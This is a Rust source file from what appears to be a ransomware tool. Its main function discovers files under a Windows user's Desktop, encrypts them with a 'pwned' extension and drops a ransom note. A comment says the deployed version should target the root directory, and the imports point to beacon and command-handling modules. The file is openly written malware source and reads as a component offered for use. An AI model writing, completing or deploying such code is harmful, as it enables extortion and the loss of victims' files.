use rand::Rng;
use std::io::{self, Write};
use local_ip_address::local_ip;
use std::sync::Arc;
use tokio::sync::{Mutex, mpsc};


use crate::utils::{logger, note, config::AppConfig};
use crate::core::targeting;
use crate::post::{
    command_handler,
    commands::{AgentCommand, ResultQueue}
};
use crate::crypto::{encryption, decryption};
use crate::communication::beacon;



pub fn ransom(logger: &logger::Logger, _config: &AppConfig) -> Result<(), Box<dyn std::error::Error>>{
    logger.init_file_logging(".")?;
    let local_ip = local_ip()?;
    logger.log(&format!("Ransomware Program starting on local IP: {}", local_ip));

    // Locate files of interest, set path to search
    let path = "C:\\Users\\Administrator\\Desktop"; // when deployed, this should be the root directory
    let targets = targeting::discover_files(&logger, &path)?;

    // Encrypt files
    let extension = "pwned"; // TODO: get from config file
    let _ = encryption::encrypt(targets, &logger, &extension)?;

    // Display ransom note with instructions, place on Desktop (TODO)
    let _ = note::generate_note(&logger, &path);

    Ok(())
}

fn ask_user_confirmation() -> bool {
    print!("Do you want to begin encrypting? (y/n): ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    matches!(input.trim().to_lowercase().as_str(), "y" | "yes")
}
